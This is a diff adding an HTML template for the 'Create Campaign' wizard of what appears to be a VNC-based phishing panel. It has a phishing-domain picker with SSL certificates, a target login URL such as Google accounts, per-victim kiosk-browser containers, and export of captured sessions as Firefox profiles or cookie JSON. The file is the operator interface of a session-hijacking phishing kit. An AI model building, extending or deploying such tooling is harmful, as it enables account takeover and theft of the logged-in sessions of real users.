@@ -1,0 +1,162 @@
+{% extends "base.html" %}
+{% block title %}Create Campaign - Panel{% endblock %}
+{% block content %}
+<div class="page-header">
+    <h1>Create Campaign</h1>
+</div>
+
+<div class="wizard" id="wizard">
+    <div class="wizard-steps">
+        <div class="wizard-step active" data-step="1">1. Basics</div>
+        <div class="wizard-step" data-step="2">2. SSL</div>
+        <div class="wizard-step" data-step="3">3. Options</div>
+        <div class="wizard-step" data-step="4">4. Review</div>
+    </div>
+
+    <form method="POST" id="campaign-form">
+        <!-- Step 1: Basics -->
+        <div class="wizard-panel active" data-step="1">
+            <h2>Basic Settings</h2>
+            <div class="form-group">
+                <label for="name">Campaign Name</label>
+                <input type="text" id="name" name="name" required placeholder="e.g. Google OAuth Test">
+            </div>
+            <div class="form-group">
+                <label for="domain_select">Phishing Domain</label>
+                <select id="domain_select" onchange="onDomainSelect()">
+                    <option value="">-- Select a managed domain --</option>
+                </select>
+                <input type="text" id="domain" name="domain" required placeholder="Or type domain manually" style="margin-top:6px">
+                <input type="hidden" id="domain_cert" name="cert_path">
+                <input type="hidden" id="domain_key" name="key_path">
+                <small>Select from <a href="/domains">managed domains</a> or type manually</small>
+            </div>
+            <div class="form-group">
+                <label for="target">Target URL</label>
+                <input type="url" id="target" name="target" required placeholder="e.g. https://accounts.google.com">
+            </div>
+            <div class="form-group">
+                <label for="num_users">Number of Users</label>
+                <input type="number" id="num_users" name="num_users" value="1" min="1" max="10">
+                <small>Each user gets a desktop + mobile VNC container</small>
+            </div>
+            <div class="form-group">
+                <label for="browser">Browser Engine</label>
+                <select id="browser" name="browser">
+                    <option value="firefox">Firefox (Default)</option>
+                    <option value="chrome">Chrome / Chromium</option>
+                </select>
+                <small>Firefox uses kiosk mode; Chrome uses kiosk + disable-infobars</small>
+            </div>
+            <div class="wizard-nav">
+                <span></span>
+                <button type="button" class="btn btn-primary" onclick="wizardNext()">Next</button>
+            </div>
+        </div>
+
+        <!-- Step 2: SSL -->
+        <div class="wizard-panel" data-step="2">
+            <h2>SSL Configuration</h2>
+            <div class="form-group">
+                <label>
+                    <input type="checkbox" id="ssl" name="ssl"> Enable SSL (HTTPS)
+                </label>
+                <small id="ssl-auto-note" style="display:none; color:#2ecc71">SSL cert auto-filled from managed domain</small>
+            </div>
+            <div id="ssl-fields" style="display:none">
+                <div class="form-group">
+                    <label for="cert_path_display">Certificate Path (PEM)</label>
+                    <input type="text" id="cert_path_display" placeholder="/etc/letsencrypt/live/domain/fullchain.pem" onchange="document.getElementById('domain_cert').value=this.value">
+                </div>
+                <div class="form-group">
+                    <label for="key_path_display">Private Key Path</label>
+                    <input type="text" id="key_path_display" placeholder="/etc/letsencrypt/live/domain/privkey.pem" onchange="document.getElementById('domain_key').value=this.value">
+                </div>
+            </div>
+            <div class="wizard-nav">
+                <button type="button" class="btn" onclick="wizardPrev()">Back</button>
+                <button type="button" class="btn btn-primary" onclick="wizardNext()">Next</button>
+            </div>
+        </div>
+
+        <!-- Step 3: Options -->
+        <div class="wizard-panel" data-step="3">
+            <h2>Advanced Options</h2>
+            <div class="form-group">
+                <label for="useragent">Custom User Agent</label>
+                <input type="text" id="useragent" name="useragent" placeholder="Leave blank for default">
+            </div>
+            <div class="form-group">
+                <label for="custom_param">Custom URL Parameters</label>
+                <input type="text" id="custom_param" name="custom_param" placeholder="Leave blank for default OAuth-style path">
+            </div>
+            <div class="form-group">
+                <label>
+                    <input type="checkbox" id="redirect" name="redirect"> Redirect to target after disconnect
+                </label>
+            </div>
+            <div class="form-group">
+                <label for="export_format">Export Format</label>
+                <select id="export_format" name="export_format">
+                    <option value="default">Full Firefox Profile</option>
+                    <option value="simple">JSON (Cookiebro compatible)</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>
+                    <input type="checkbox" id="zip_profile" name="zip_profile" checked> Compress profile to ZIP
+                </label>
+            </div>
+            <div class="wizard-nav">
+                <button type="button" class="btn" onclick="wizardPrev()">Back</button>
+                <button type="button" class="btn btn-primary" onclick="wizardNext()">Next</button>
+            </div>
+        </div>
+
+        <!-- Step 4: Review -->
+        <div class="wizard-panel" data-step="4">
+            <h2>Review &amp; Launch</h2>
+            <div class="review-table" id="review-summary"></div>
+            <div class="wizard-nav">
+                <button type="button" class="btn" onclick="wizardPrev()">Back</button>
+                <button type="submit" class="btn btn-primary">Create Campaign</button>
+            </div>
+        </div>
+    </form>
+</div>
+{% endblock %}
+{% block extra_js %}
+<script>
+// Load managed domains into dropdown
+var managedDomains = [];
+fetch('/api/domains/list').then(r=>r.json()).then(data => {
+    managedDomains = data.domains || [];
+    var sel = document.getElementById('domain_select');
+    managedDomains.forEach(d => {
+        var opt = document.createElement('option');
+        opt.value = d.name;
+        opt.textContent = d.name + ' (SSL ready)';
+        opt.dataset.cert = d.cert_path;
+        opt.dataset.key = d.key_path;
+        sel.appendChild(opt);
+    });
+}).catch(()=>{});
+
+function onDomainSelect() {
+    var sel = document.getElementById('domain_select');
+    var opt = sel.options[sel.selectedIndex];
+    if (sel.value) {
+        document.getElementById('domain').value = sel.value;
+        document.getElementById('domain_cert').value = opt.dataset.cert || '';
+        document.getElementById('domain_key').value = opt.dataset.key || '';
+        // Auto-enable SSL
+        document.getElementById('ssl').checked = true;
+        document.getElementById('ssl-fields').style.display = 'block';
+        document.getElementById('cert_path_display').value = opt.dataset.cert || '';
+        document.getElementById('key_path_display').value = opt.dataset.key || '';
+        document.getElementById('ssl-auto-note').style.display = 'block';
+    }
+}
+</script>
+<script src="{{ url_for('static', filename='js/campaign_wizard.js') }}"></script>
+{% endblock %}
